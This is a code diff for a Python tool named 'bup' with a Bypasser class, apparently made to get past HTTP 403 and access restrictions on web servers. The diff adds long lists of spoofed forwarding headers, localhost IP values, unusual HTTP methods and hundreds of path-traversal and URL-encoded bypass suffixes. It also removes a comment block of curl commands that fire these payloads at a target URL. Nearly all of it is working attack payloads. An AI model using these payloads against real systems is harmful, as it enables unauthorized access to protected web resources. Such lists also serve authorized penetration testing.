@@ -32,6 +32,325 @@ VERSION = "0.1.0"
 logger = logging.getLogger("bup")
 config = dict()
 
+const_internal_ips = list()
+const_internal_ips.append("0.0.0.0")
+const_internal_ips.append("127.0.0.1")
+const_internal_ips.append("localhost")
+const_internal_ips.append("norealhost")
+
+const_http_methods = list()
+const_http_methods.append("CONNECT")
+const_http_methods.append("GET")
+const_http_methods.append("LOCK")
+const_http_methods.append("OPTIONS")
+const_http_methods.append("PATCH")
+const_http_methods.append("POST")
+const_http_methods.append("PUT")
+const_http_methods.append("TRACE")
+const_http_methods.append("TRACK")
+const_http_methods.append("UPDATE")
+
+const_header_scheme = list()
+const_header_scheme.append("X-Forwarded-Scheme") # http https
+const_header_port = list()
+const_header_port.append("X-Forwarded-Port")#  443 4443 80 8080 8443
+const_header_host = list()
+const_header_host.append("Access-Control-Allow-Origin")
+const_header_host.append("Base-Url")
+const_header_host.append("CF-Connecting_IP")
+const_header_host.append("CF-Connecting-IP")
+const_header_host.append("Client-IP")
+const_header_host.append("Content-Length")
+const_header_host.append("Destination")
+const_header_host.append("Forwarded")
+const_header_host.append("Forwarded-For")
+const_header_host.append("Forwarded-For-IP")
+const_header_host.append("Host")
+const_header_host.append("Http-Url")
+const_header_host.append("Origin")
+const_header_host.append("Profile")
+const_header_host.append("Proxy")
+const_header_host.append("Proxy-Host")
+const_header_host.append("Proxy-Url")
+const_header_host.append("Real-Ip")
+const_header_host.append("Redirect")
+const_header_host.append("Referer")
+const_header_host.append("Referrer")
+const_header_host.append("Request-Uri")
+const_header_host.append("True-Client-IP")
+const_header_host.append("Uri")
+const_header_host.append("Url")
+const_header_host.append("X-Arbitrary")
+const_header_host.append("X-Client-IP")
+const_header_host.append("X-Custom-IP-Authorization")
+const_header_host.append("X-Forward-For")
+const_header_host.append("X-Forwarded")
+const_header_host.append("X-Forwarded-By")
+const_header_host.append("X-Forwarded-For")
+const_header_host.append("X-Forwarded-For-Original")
+const_header_host.append("X-Forwarded-Host")
+const_header_host.append("X-Forwarded-Proto")
+const_header_host.append("X-Forwarded-Server")
+const_header_host.append("X-Forwarder-For")
+const_header_host.append("X-Host")
+const_header_host.append("X-Http-Destinationurl")
+const_header_host.append("X-HTTP-DestinationURL")
+const_header_host.append("X-Http-Host-Override")
+const_header_host.append("X-OReferrer")
+const_header_host.append("X-Original-Remote-Addr")
+const_header_host.append("X-Original-URL")
+const_header_host.append("X-Originally-Forwarded-For")
+const_header_host.append("X-Originating-")
+const_header_host.append("X-Originating-IP")
+const_header_host.append("X-Proxy-Url")
+const_header_host.append("X-ProxyUser-Ip")
+const_header_host.append("X-Real-Ip")
+const_header_host.append("X-Remote-Addr")
+const_header_host.append("X-Remote-IP")
+const_header_host.append("X-Rewrite-URL")
+const_header_host.append("X-WAP-Profile")
+
+const_path = list()
+const_path.append(";")
+const_path.append(";/.;.")
+const_path.append(";/..")
+const_path.append(";/..;")
+const_path.append(";/../")
+const_path.append(";/../;/")
+const_path.append(";/../;/../")
+const_path.append(";/../.;/../")
+const_path.append(";/../../")
+const_path.append(";/../..//")
+const_path.append(";/.././../")
+const_path.append(";/..//")
+const_path.append(";/..//../")
+const_path.append(";/..///")
+const_path.append(";/..//%2e%2e/")
+const_path.append(";/..//%2f")
+const_path.append(";/../%2f/")
+const_path.append(";/..%2f")
+const_path.append(";/..%2f..%2f")
+const_path.append(";/..%2f/")
+const_path.append(";/..%2f//")
+const_path.append(";/..%2f%2f../")
+const_path.append(";/.%2e")
+const_path.append(";/.%2e/%2e%2e/%2f")
+const_path.append(";//..")
+const_path.append(";//../../")
+const_path.append(";///..")
+const_path.append(";///../")
+const_path.append(";///..//")
+const_path.append(";//%2f../")
+const_path.append(";/%2e.")
+const_path.append(";/%2e%2e")
+const_path.append(";/%2e%2e/")
+const_path.append(";/%2e%2e%2f/")
+const_path.append(";/%2e%2e%2f%2f")
+const_path.append(";/%2f/../")
+const_path.append(";/%2f/..%2f")
+const_path.append(";/%2f%2f../")
+const_path.append(";%09")
+const_path.append(";%09;")
+const_path.append(";%09..")
+const_path.append(";%09..;")
+const_path.append(";%2f;/;/..;/")
+const_path.append(";%2f;//../")
+const_path.append(";%2f..")
+const_path.append(";%2f..;/;//")
+const_path.append(";%2f..;//;/")
+const_path.append(";%2f..;///")
+const_path.append(";%2f../;/;/")
+const_path.append(";%2f../;/;/;")
+const_path.append(";%2f../;//")
+const_path.append(";%2f..//;/")
+const_path.append(";%2f..//;/;")
+const_path.append(";%2f..//../")
+const_path.append(";%2f..//..%2f")
+const_path.append(";%2f..///")
+const_path.append(";%2f..///;")
+const_path.append(";%2f../%2f../")
+const_path.append(";%2f../%2f..%2f")
+const_path.append(";%2f..%2f..%2f%2f")
+const_path.append(";%2f..%2f/")
+const_path.append(";%2f..%2f/../")
+const_path.append(";%2f..%2f/..%2f")
+const_path.append(";%2f..%2f%2e%2e%2f%2f")
+const_path.append(";%2f/;/..;/")
+const_path.append(";%2f/;/../")
+const_path.append(";%2f//..;/")
+const_path.append(";%2f//../")
+const_path.append(";%2f//..%2f")
+const_path.append(";%2f/%2f../")
+const_path.append(";%2f%2e%2e")
+const_path.append(";%2f%2e%2e%2f%2e%2e%2f%2f")
+const_path.append(";%2f%2f/../")
+const_path.append(";x")
+const_path.append(";x;")
+const_path.append(";x/")
+const_path.append("?")
+const_path.append("??")
+const_path.append("???")
+const_path.append("..")
+const_path.append("..;/")
+const_path.append("..;\\;")
+const_path.append("..;\\\\")
+const_path.append("..;%00/")
+const_path.append("..;%0d/")
+const_path.append("..;%ff/")
+const_path.append("../")
+const_path.append(".././")
+const_path.append("..\\;")
+const_path.append("..\\\\")
+const_path.append("..%00;/")
+const_path.append("..%00/")
+const_path.append("..%00/;")
+const_path.append("..%09")
+const_path.append("..%0d;/")
+const_path.append("..%0d/")
+const_path.append("..%0d/;")
+const_path.append("..%2f")
+const_path.append("..%5c")
+const_path.append("..%5c/")
+const_path.append("..%ff")
+const_path.append("..%ff;/")
+const_path.append("..%ff/;")
+const_path.append("./.")
+const_path.append(".//./")
+const_path.append(".%2e/")
+const_path.append(".html")
+const_path.append(".json")
+const_path.append("/")
+const_path.append("/;/")
+const_path.append("/;//")
+const_path.append("/;x")
+const_path.append("/;x/")
+const_path.append("/.")
+const_path.append("/.;/")
+const_path.append("/.;//")
+const_path.append("/..")
+const_path.append("/..;/")
+const_path.append("/..;/;/")
+const_path.append("/..;/;/..;/")
+const_path.append("/..;/..;/")
+const_path.append("/..;/../")
+const_path.append("/..;//")
+const_path.append("/..;//..;/")
+const_path.append("/..;//../")
+const_path.append("/..;%2f")
+const_path.append("/..;%2f..;%2f")
+const_path.append("/..;%2f..;%2f..;%2f")
+const_path.append("/../")
+const_path.append("/../;/")
+const_path.append("/../;/../")
+const_path.append("/../.;/../")
+const_path.append("/../..;/")
+const_path.append("/../../")
+const_path.append("/../../../")
+const_path.append("/../../..//")
+const_path.append("/../..//")
+const_path.append("/../..//../")
+const_path.append("/.././../")
+const_path.append("/..//")
+const_path.append("/..//..;/")
+const_path.append("/..//../")
+const_path.append("/..//../../")
+const_path.append("/..%2f")
+const_path.append("/..%2f..%2f")
+const_path.append("/..%2f..%2f..%2f")
+const_path.append("/./")
+const_path.append("/.//")
+const_path.append("/.randomstring")
+const_path.append("/*")
+const_path.append("/*/")
+const_path.append("//")
+const_path.append("//;/")
+const_path.append("//?anything")
+const_path.append("//.")
+const_path.append("//.;/")
+const_path.append("//..")
+const_path.append("//..;")
+const_path.append("//../../")
+const_path.append("//./")
+const_path.append("///..")
+const_path.append("///..;")
+const_path.append("///..;/")
+const_path.append("///..;//")
+const_path.append("///../")
+const_path.append("///..//")
+const_path.append("////")
+const_path.append("/%20#")
+const_path.append("/%20%20/")
+const_path.append("/%20%23")
+const_path.append("/%252e/")
+const_path.append("/%252e%252e%252f/")
+const_path.append("/%252e%252e%253b/")
+const_path.append("/%252e%252f/")
+const_path.append("/%252e%253b/")
+const_path.append("/%252f")
+const_path.append("/%2e/")
+const_path.append("/%2e//")
+const_path.append("/%2e%2e")
+const_path.append("/%2e%2e/")
+const_path.append("/%2e%2e%3b/")
+const_path.append("/%2e%2f/")
+const_path.append("/%2e%3b/")
+const_path.append("/%2e%3b//")
+const_path.append("/%2f")
+const_path.append("/%3b/")
+const_path.append("/x/;/..;/")
+const_path.append("/x/;/../")
+const_path.append("/x/..;/")
+const_path.append("/x/..;/;/")
+const_path.append("/x/..;//")
+const_path.append("/x/../")
+const_path.append("/x/../;/")
+const_path.append("/x/..//")
+const_path.append("/x//..;/")
+const_path.append("/x//../")
+const_path.append("\\..\\.\\")
+const_path.append("&")
+const_path.append("#")
+const_path.append("#?")
+const_path.append("%")
+const_path.append("%09")
+const_path.append("%09;")
+const_path.append("%09..")
+const_path.append("%09%3b")
+const_path.append("%20")
+const_path.append("%20/")
+const_path.append("%23")
+const_path.append("%23%3f")
+const_path.append("%252f/")
+const_path.append("%252f%252f")
+const_path.append("%26")
+const_path.append("%2e")
+const_path.append("%2e%2e")
+const_path.append("%2e%2e/")
+const_path.append("%2e%2e%2f")
+const_path.append("%2f")
+const_path.append("%2f/")
+const_path.append("%2f%20%23")
+const_path.append("%2f%23")
+const_path.append("%2f%2f")
+const_path.append("%2f%3b%2f")
+const_path.append("%2f%3b%2f%2f")
+const_path.append("%2f%3f")
+const_path.append("%2f%3f/")
+const_path.append("%3b")
+const_path.append("%3b/..")
+const_path.append("%3b//%2f../")
+const_path.append("%3b/%2e.")
+const_path.append("%3b/%2e%2e/..%2f%2f")
+const_path.append("%3b/%2f%2f../")
+const_path.append("%3b%09")
+const_path.append("%3b%2f..")
+const_path.append("%3b%2f%2e.")
+const_path.append("%3b%2f%2e%2e")
+const_path.append("%3b%2f%2e%2e%2f%2e%2e%2f%2f")
+const_path.append("%3f")
+const_path.append("%3f%23")
+const_path.append("%3f%3f")
+
 
 class Bypasser:
     def __init__(self, config):
@@ -127,581 +446,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-
-"""
-# TODO
-curl -X GET "$URL"
-curl -H "X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242" -X GET "$URL"
-curl -H "X-Originating-: 127.0.0.1, 68.180.194.242" -X GET "$URL"
-curl -H "X-Originating-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL"
-curl -H "True-Client-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL"
-curl -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$URL"
-curl -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$URL"
-curl -H "Profile: http://$VHOST" -X GET "$URL"
-curl -H "X-Arbitrary: http://$VHOST" -X GET "$URL"
-curl -H "X-HTTP-DestinationURL: http://$VHOST" -X GET "$URL"
-curl -H "X-Forwarded-Proto: http://$VHOST" -X GET "$URL"
-curl -H "Destination: 127.0.0.1, 68.180.194.242" -X GET "$URL"
-curl -H "Proxy: 127.0.0.1, 68.180.194.242" -X GET "$URL"
-curl -H "CF-Connecting_IP: 127.0.0.1, 68.180.194.242" -X GET "$URL"
-curl -H "CF-Connecting-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL"
-curl -H "Referer: $URL" -X GET "$URL"
-curl -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL"
-curl -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL..;/"
-curl -H "X-Originating-IP: 127.0.0.1" -X GET "$URL"
-curl -H "X-Forwarded-For: 127.0.0.1" -X GET "$URL"
-curl -H "X-Remote-IP: 127.0.0.1" -X GET "$URL"
-curl -H "X-Client-IP: 127.0.0.1" -X GET "$URL"
-curl -H "X-Host: 127.0.0.1" -X GET "$URL"
-curl -H "X-Forwarded-Host: 127.0.0.1" -X GET "$URL"
-curl -H "X-Original-URL: /$PAT" -X GET "$URL/anything"
-curl -H "X-Rewrite-URL: /$PAT" -X GET "$URL"
-curl -H "Content-Length: 0" -X GET "$URL"
-curl -H "X-ProxyUser-Ip: 127.0.0.1" -X GET "$URL"
-curl -H "Base-Url: 127.0.0.1" -X GET "$URL"
-curl -H "Client-IP: 127.0.0.1" -X GET "$URL"
-curl -H "Http-Url: 127.0.0.1" -X GET "$URL"
-curl -H "Proxy-Host: 127.0.0.1" -X GET "$URL"
-curl -H "Proxy-Url: 127.0.0.1" -X GET "$URL"
-curl -H "Real-Ip: 127.0.0.1" -X GET "$URL"
-curl -H "Redirect: 127.0.0.1" -X GET "$URL"
-curl -H "Referrer: 127.0.0.1" -X GET "$URL"
-curl -H "Request-Uri: 127.0.0.1" -X GET "$URL"
-curl -H "Uri: 127.0.0.1" -X GET "$URL"
-curl -H "Url: 127.0.0.1" -X GET "$URL"
-curl -H "X-Forward-For: 127.0.0.1" -X GET "$URL"
-curl -H "X-Forwarded-By: 127.0.0.1" -X GET "$URL"
-curl -H "X-Forwarded-For-Original: 127.0.0.1" -X GET "$URL"
-curl -H "X-Forwarded-Server: 127.0.0.1" -X GET "$URL"
-curl -H "X-Forwarded: 127.0.0.1" -X GET "$URL"
-curl -H "X-Forwarder-For: 127.0.0.1" -X GET "$URL"
-curl -H "X-Http-Destinationurl: 127.0.0.1" -X GET "$URL"
-curl -H "X-Http-Host-Override: 127.0.0.1" -X GET "$URL"
-curl -H "X-Original-Remote-Addr: 127.0.0.1" -X GET "$URL"
-curl -H "X-Proxy-Url: 127.0.0.1" -X GET "$URL"
-curl -H "X-Real-Ip: 127.0.0.1" -X GET "$URL"
-curl -H "X-Remote-Addr: 127.0.0.1" -X GET "$URL"
-curl -H "Host: " -X GET "$URL"
-curl -H "Host: localhost" -X GET "$URL"
-curl -H "Host: 127.0.0.1" -X GET "$URL"
-curl -H "Host: 0.0.0.0" -X GET "$URL"
-curl -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "$URL"
-curl -X GET "http://$VHOST/$PAT"
-curl -X GET "https://$VHOST/$PAT"
-curl -H "X-Forwarded-Scheme: http" -X GET "$URL"
-curl -H "X-Forwarded-Scheme: https" -X GET "$URL"
-curl -H "X-Forwarded-Port: 443" -X GET "$URL"
-curl -H "X-Forwarded-Port: 4443" -X GET "$URL"
-curl -H "X-Forwarded-Port: 80" -X GET "$URL"
-curl -H "X-Forwarded-Port: 8080" -X GET "$URL"
-curl -H "X-Forwarded-Port: 8443" -X GET "$URL"
-curl "$URL" -L -X GET
-curl "$URL" -L -X POST
-curl "$URL" -L -I
-curl "$URL" -L -X OPTIONS
-curl "$URL" -L -X PUT
-curl "$URL" -L -X TRACE
-curl "$URL" -L -X PATCH
-curl "$URL" -L -X TRACK
-curl "$URL" -L -X CONNECT
-curl "$URL" -L -X UPDATE
-curl "$URL" -L -X LOCK
-curl "$URL#?"
-curl "$URL%09"
-curl "$URL%09%3b"
-curl "$URL%09.."
-curl "$URL%09;"
-curl "$URL%20"
-curl "$URL%23%3f"
-curl "$URL%252f%252f"
-curl "$URL%252f/"
-curl "$URL%2e%2e"
-curl "$URL%2e%2e/"
-curl "$URL%2f"
-curl "$URL%2f%20%23"
-curl "$URL%2f%23"
-curl "$URL%2f%2f"
-curl "$URL%2f%3b%2f"
-curl "$URL%2f%3b%2f%2f"
-curl "$URL%2f%3f"
-curl "$URL%2f%3f/"
-curl "$URL%2f/"
-curl "$URL%3b"
-curl "$URL%3b%09"
-curl "$URL%3b%2f%2e%2e"
-curl "$URL%3b%2f%2e%2e%2f%2e%2e%2f%2f"
-curl "$URL%3b%2f%2e."
-curl "$URL%3b%2f.."
-curl "$URL%3b/%2e%2e/..%2f%2f"
-curl "$URL%3b/%2e."
-curl "$URL%3b/%2f%2f../"
-curl "$URL%3b/.."
-curl "$URL%3b//%2f../"
-curl "$URL%3f%23"
-curl "$URL%3f%3f"
-curl "$URL.."
-curl "$URL..%00/;"
-curl "$URL..%00;/"
-curl "$URL..%09"
-curl "$URL..%0d/;"
-curl "$URL..%0d;/"
-curl "$URL..%5c/"
-curl "$URL..%ff/;"
-curl "$URL..%ff;/"
-curl "$URL..;%00/"
-curl "$URL..;%0d/"
-curl "$URL..;%ff/"
-curl "$URL..;\\"
-curl "$URL..;\;"
-curl "$URL..\;"
-curl "$URL/%20#"
-curl "$URL/%20%23"
-curl "$URL/%252e%252e%252f/"
-curl "$URL/%252e%252e%253b/"
-curl "$URL/%252e%252f/"
-curl "$URL/%252e%253b/"
-curl "$URL/%252e/"
-curl "$URL/%252f"
-curl "$URL/%2e%2e"
-curl "$URL/%2e%2e%3b/"
-curl "$URL/%2e%2e/"
-curl "$URL/%2e%2f/"
-curl "$URL/%2e%3b/"
-curl "$URL/%2e%3b//"
-curl "$URL/%2e/"
-curl "$URL/%2e//"
-curl "$URL/%2f"
-curl "$URL/%3b/"
-curl "$URL/.."
-curl "$URL/..%2f"
-curl "$URL/..%2f..%2f"
-curl "$URL/..%2f..%2f..%2f"
-curl "$URL/../"
-curl "$URL/../../"
-curl "$URL/../../../"
-curl "$URL/../../..//"
-curl "$URL/../..//"
-curl "$URL/../..//../"
-curl "$URL/../..;/"
-curl "$URL/.././../"
-curl "$URL/../.;/../"
-curl "$URL/..//"
-curl "$URL/..//../"
-curl "$URL/..//../../"
-curl "$URL/..//..;/"
-curl "$URL/../;/"
-curl "$URL/../;/../"
-curl "$URL/..;%2f"
-curl "$URL/..;%2f..;%2f"
-curl "$URL/..;%2f..;%2f..;%2f"
-curl "$URL/..;/../"
-curl "$URL/..;/..;/"
-curl "$URL/..;//"
-curl "$URL/..;//../"
-curl "$URL/..;//..;/"
-curl "$URL/..;/;/"
-curl "$URL/..;/;/..;/"
-curl "$URL/.//"
-curl "$URL/.;/"
-curl "$URL/.;//"
-curl "$URL//.."
-curl "$URL//../../"
-curl "$URL//..;"
-curl "$URL//./"
-curl "$URL//.;/"
-curl "$URL///.."
-curl "$URL///../"
-curl "$URL///..//"
-curl "$URL///..;"
-curl "$URL///..;/"
-curl "$URL///..;//"
-curl "$URL//;/"
-curl "$URL/;/"
-curl "$URL/;//"
-curl "$URL/;x"
-curl "$URL/;x/"
-curl "$URL/x/../"
-curl "$URL/x/..//"
-curl "$URL/x/../;/"
-curl "$URL/x/..;/"
-curl "$URL/x/..;//"
-curl "$URL/x/..;/;/"
-curl "$URL/x//../"
-curl "$URL/x//..;/"
-curl "$URL/x/;/../"
-curl "$URL/x/;/..;/"
-curl "$URL;"
-curl "$URL;%09"
-curl "$URL;%09.."
-curl "$URL;%09..;"
-curl "$URL;%09;"
-curl "$URL;%2F.."
-curl "$URL;%2f%2e%2e"
-curl "$URL;%2f%2e%2e%2f%2e%2e%2f%2f"
-curl "$URL;%2f%2f/../"
-curl "$URL;%2f.."
-curl "$URL;%2f..%2f%2e%2e%2f%2f"
-curl "$URL;%2f..%2f..%2f%2f"
-curl "$URL;%2f..%2f/"
-curl "$URL;%2f..%2f/..%2f"
-curl "$URL;%2f..%2f/../"
-curl "$URL;%2f../%2f..%2f"
-curl "$URL;%2f../%2f../"
-curl "$URL;%2f..//..%2f"
-curl "$URL;%2f..//../"
-curl "$URL;%2f..///"
-curl "$URL;%2f..///;"
-curl "$URL;%2f..//;/"
-curl "$URL;%2f..//;/;"
-curl "$URL;%2f../;//"
-curl "$URL;%2f../;/;/"
-curl "$URL;%2f../;/;/;"
-curl "$URL;%2f..;///"
-curl "$URL;%2f..;//;/"
-curl "$URL;%2f..;/;//"
-curl "$URL;%2f/%2f../"
-curl "$URL;%2f//..%2f"
-curl "$URL;%2f//../"
-curl "$URL;%2f//..;/"
-curl "$URL;%2f/;/../"
-curl "$URL;%2f/;/..;/"
-curl "$URL;%2f;//../"
-curl "$URL;%2f;/;/..;/"
-curl "$URL;/%2e%2e"
-curl "$URL;/%2e%2e%2f%2f"
-curl "$URL;/%2e%2e%2f/"
-curl "$URL;/%2e%2e/"
-curl "$URL;/%2e."
-curl "$URL;/%2f%2f../"
-curl "$URL;/%2f/..%2f"
-curl "$URL;/%2f/../"
-curl "$URL;/.%2e"
-curl "$URL;/.%2e/%2e%2e/%2f"
-curl "$URL;/.."
-curl "$URL;/..%2f"
-curl "$URL;/..%2f%2f../"
-curl "$URL;/..%2f..%2f"
-curl "$URL;/..%2f/"
-curl "$URL;/..%2f//"
-curl "$URL;/../"
-curl "$URL;/../%2f/"
-curl "$URL;/../../"
-curl "$URL;/../..//"
-curl "$URL;/.././../"
-curl "$URL;/../.;/../"
-curl "$URL;/..//"
-curl "$URL;/..//%2e%2e/"
-curl "$URL;/..//%2f"
-curl "$URL;/..//../"
-curl "$URL;/..///"
-curl "$URL;/../;/"
-curl "$URL;/../;/../"
-curl "$URL;/..;"
-curl "$URL;/.;."
-curl "$URL;//%2f../"
-curl "$URL;//.."
-curl "$URL;//../../"
-curl "$URL;///.."
-curl "$URL;///../"
-curl "$URL;///..//"
-curl "$URL;x"
-curl "$URL;x/"
-curl "$URL;x;"
-curl "$URL&"
-curl "$URL%"
-curl "$URL%09"
-curl "$URL../"
-curl "$URL..%2f"
-curl "$URL.././"
-curl "$URL..%00/"
-curl "$URL..%0d/"
-curl "$URL..%5c"
-curl "$URL..\\"
-curl "$URL..%ff"
-curl "$URL%2e%2e%2f"
-curl "$URL.%2e/"
-curl "$URL%3f"
-curl "$URL%26"
-curl "$URL%23"
-curl "$URL%2e"
-curl "$URL/."
-curl "$URL?"
-curl "$URL??"
-curl "$URL???"
-curl "$URL//"
-curl "$URL/./"
-curl "$URL.//./"
-curl "$URL//?anything"
-curl "$URL#"
-curl "$URL/"
-curl "$URL/.randomstring"
-curl "$URL..;/"
-curl "$URL.html"
-curl "$URL%20/"
-curl "$URL/%20$PAT%20/"
-curl "$URL.json"
-curl "$URL\..\.\\"
-curl "$URL/*"
-curl "$URL./."
-curl "$URL/*/"
-curl "$URL/..;/"
-curl "$URL/%2e/$PAT"
-curl "$URL/%2e/"
-curl "$URL//."
-curl "$URL////"
-curl "$URL/../"
-curl "$URL/;$PAT/"
-curl "$SCHEME://$VHOST/%3F$PAT"
-curl "$SCHEME://$VHOST/%09$PAT"
-curl "$SCHEME://$VHOST/%09%3b$PAT"
-curl "$SCHEME://$VHOST/%09..$PAT"
-curl "$SCHEME://$VHOST/%09;$PAT"
-curl "$SCHEME://$VHOST/%20$PAT"
-curl "$SCHEME://$VHOST/%23%3f$PAT"
-curl "$SCHEME://$VHOST/%252f%252f$PAT"
-curl "$SCHEME://$VHOST/%252f/$PAT"
-curl "$SCHEME://$VHOST/%2e%2e$PAT"
-curl "$SCHEME://$VHOST/%2e%2e/$PAT"
-curl "$SCHEME://$VHOST/%2f$PAT"
-curl "$SCHEME://$VHOST/%2f%20%23$PAT"
-curl "$SCHEME://$VHOST/%2f%23$PAT"
-curl "$SCHEME://$VHOST/%2f%2f$PAT"
-curl "$SCHEME://$VHOST/%2f%3b%2f$PAT"
-curl "$SCHEME://$VHOST/%2f%3b%2f%2f$PAT"
-curl "$SCHEME://$VHOST/%2f%3f$PAT"
-curl "$SCHEME://$VHOST/%2f%3f/$PAT"
-curl "$SCHEME://$VHOST/%2f/$PAT"
-curl "$SCHEME://$VHOST/%3b$PAT"
-curl "$SCHEME://$VHOST/%3b%09$PAT"
-curl "$SCHEME://$VHOST/%3b%2f%2e%2e$PAT"
-curl "$SCHEME://$VHOST/%3b%2f%2e%2e%2f%2e%2e%2f%2f$PAT"
-curl "$SCHEME://$VHOST/%3b%2f%2e.$PAT"
-curl "$SCHEME://$VHOST/%3b%2f..$PAT"
-curl "$SCHEME://$VHOST/%3b/%2e%2e/..%2f%2f$PAT"
-curl "$SCHEME://$VHOST/%3b/%2e.$PAT"
-curl "$SCHEME://$VHOST/%3b/%2f%2f../$PAT"
-curl "$SCHEME://$VHOST/%3b/..$PAT"
-curl "$SCHEME://$VHOST/%3b//%2f../$PAT"
-curl "$SCHEME://$VHOST/%3f%23$PAT"
-curl "$SCHEME://$VHOST/%3f%3f$PAT"
-curl "$SCHEME://$VHOST/..$PAT"
-curl "$SCHEME://$VHOST/..%00/$PAT;"
-curl "$SCHEME://$VHOST/..%00;/$PAT"
-curl "$SCHEME://$VHOST/..%09$PAT"
-curl "$SCHEME://$VHOST/..%0d/;$PAT"
-curl "$SCHEME://$VHOST/..%0d;/$PAT"
-curl "$SCHEME://$VHOST/..%5c/$PAT"
-curl "$SCHEME://$VHOST/..%ff/;$PAT"
-curl "$SCHEME://$VHOST/..%ff;/$PAT"
-curl "$SCHEME://$VHOST/..;%00/$PAT"
-curl "$SCHEME://$VHOST/..;%0d/$PAT"
-curl "$SCHEME://$VHOST/..;%ff/$PAT"
-curl "$SCHEME://$VHOST/..;\\$PAT"
-curl "$SCHEME://$VHOST/..;\;$PAT"
-curl "$SCHEME://$VHOST/..\;$PAT"
-curl "$SCHEME://$VHOST//%20$PAT#"
-curl "$SCHEME://$VHOST//%20%23$PAT"
-curl "$SCHEME://$VHOST//%252e%252e%252f/$PAT"
-curl "$SCHEME://$VHOST//%252e%252e%253b/$PAT"
-curl "$SCHEME://$VHOST//%252e%252f/$PAT"
-curl "$SCHEME://$VHOST//%252e%253b/$PAT"
-curl "$SCHEME://$VHOST//%252e/$PAT"
-curl "$SCHEME://$VHOST//%252f$PAT"
-curl "$SCHEME://$VHOST//%2e%2e$PAT"
-curl "$SCHEME://$VHOST//%2e%2e%3b/$PAT"
-curl "$SCHEME://$VHOST//%2e%2e/$PAT"
-curl "$SCHEME://$VHOST//%2e%2f/$PAT"
-curl "$SCHEME://$VHOST//%2e%3b/$PAT"
-curl "$SCHEME://$VHOST//%2e%3b//$PAT"
-curl "$SCHEME://$VHOST//%2e/$PAT"
-curl "$SCHEME://$VHOST//%2e//$PAT"
-curl "$SCHEME://$VHOST//%2f$PAT"
-curl "$SCHEME://$VHOST//%3b/$PAT"
-curl "$SCHEME://$VHOST//..$PAT"
-curl "$SCHEME://$VHOST//..%2f$PAT"
-curl "$SCHEME://$VHOST//..%2f..%2f$PAT"
-curl "$SCHEME://$VHOST//..%2f..%2f..%2f$PAT"
-curl "$SCHEME://$VHOST//../$PAT"
-curl "$SCHEME://$VHOST//../../$PAT"
-curl "$SCHEME://$VHOST//../../../$PAT"
-curl "$SCHEME://$VHOST//../../..//$PAT"
-curl "$SCHEME://$VHOST//../..//$PAT"
-curl "$SCHEME://$VHOST//../..//../$PAT"
-curl "$SCHEME://$VHOST//../..;/$PAT"
-curl "$SCHEME://$VHOST//.././../$PAT"
-curl "$SCHEME://$VHOST//../.;/../$PAT"
-curl "$SCHEME://$VHOST//..//$PAT"
-curl "$SCHEME://$VHOST//..//../$PAT"
-curl "$SCHEME://$VHOST//..//../../$PAT"
-curl "$SCHEME://$VHOST//..//..;/$PAT"
-curl "$SCHEME://$VHOST//../;/$PAT"
-curl "$SCHEME://$VHOST//../;/../$PAT"
-curl "$SCHEME://$VHOST//..;%2f$PAT"
-curl "$SCHEME://$VHOST//..;%2f..;%2f$PAT"
-curl "$SCHEME://$VHOST//..;%2f..;%2f..;%2f$PAT"
-curl "$SCHEME://$VHOST//..;/../$PAT"
-curl "$SCHEME://$VHOST//..;/..;/$PAT"
-curl "$SCHEME://$VHOST//..;//$PAT"
-curl "$SCHEME://$VHOST//..;//../$PAT"
-curl "$SCHEME://$VHOST//..;//..;/$PAT"
-curl "$SCHEME://$VHOST//..;/;/$PAT"
-curl "$SCHEME://$VHOST//..;/;/..;/$PAT"
-curl "$SCHEME://$VHOST//.//$PAT"
-curl "$SCHEME://$VHOST//.;/$PAT"
-curl "$SCHEME://$VHOST//.;//$PAT"
-curl "$SCHEME://$VHOST///..$PAT"
-curl "$SCHEME://$VHOST///../../$PAT"
-curl "$SCHEME://$VHOST///..;$PAT"
-curl "$SCHEME://$VHOST///./$PAT"
-curl "$SCHEME://$VHOST///.;/$PAT"
-curl "$SCHEME://$VHOST////..$PAT"
-curl "$SCHEME://$VHOST////../$PAT"
-curl "$SCHEME://$VHOST////..//$PAT"
-curl "$SCHEME://$VHOST////..;$PAT"
-curl "$SCHEME://$VHOST////..;/$PAT"
-curl "$SCHEME://$VHOST////..;//$PAT"
-curl "$SCHEME://$VHOST///;/$PAT"
-curl "$SCHEME://$VHOST//;/$PAT"
-curl "$SCHEME://$VHOST//;//$PAT"
-curl "$SCHEME://$VHOST//;x$PAT"
-curl "$SCHEME://$VHOST//;x/$PAT"
-curl "$SCHEME://$VHOST//x/../$PAT"
-curl "$SCHEME://$VHOST//x/..//$PAT"
-curl "$SCHEME://$VHOST//x/../;/$PAT"
-curl "$SCHEME://$VHOST//x/..;/$PAT"
-curl "$SCHEME://$VHOST//x/..;//$PAT"
-curl "$SCHEME://$VHOST//x/..;/;/$PAT"
-curl "$SCHEME://$VHOST//x//../$PAT"
-curl "$SCHEME://$VHOST//x//..;/$PAT"
-curl "$SCHEME://$VHOST//x/;/../$PAT"
-curl "$SCHEME://$VHOST//x/;/..;/$PAT"
-curl "$SCHEME://$VHOST/;$PAT"
-curl "$SCHEME://$VHOST/;%09$PAT"
-curl "$SCHEME://$VHOST/;%09..$PAT"
-curl "$SCHEME://$VHOST/;%09..;$PAT"
-curl "$SCHEME://$VHOST/;%09;$PAT"
-curl "$SCHEME://$VHOST/;%2F..$PAT"
-curl "$SCHEME://$VHOST/;%2f%2e%2e$PAT"
-curl "$SCHEME://$VHOST/;%2f%2e%2e%2f%2e%2e%2f%2f$PAT"
-curl "$SCHEME://$VHOST/;%2f%2f/../$PAT"
-curl "$SCHEME://$VHOST/;%2f..$PAT"
-curl "$SCHEME://$VHOST/;%2f..%2f%2e%2e%2f%2f$PAT"
-curl "$SCHEME://$VHOST/;%2f..%2f..%2f%2f$PAT"
-curl "$SCHEME://$VHOST/;%2f..%2f/$PAT"
-curl "$SCHEME://$VHOST/;%2f..%2f/..%2f$PAT"
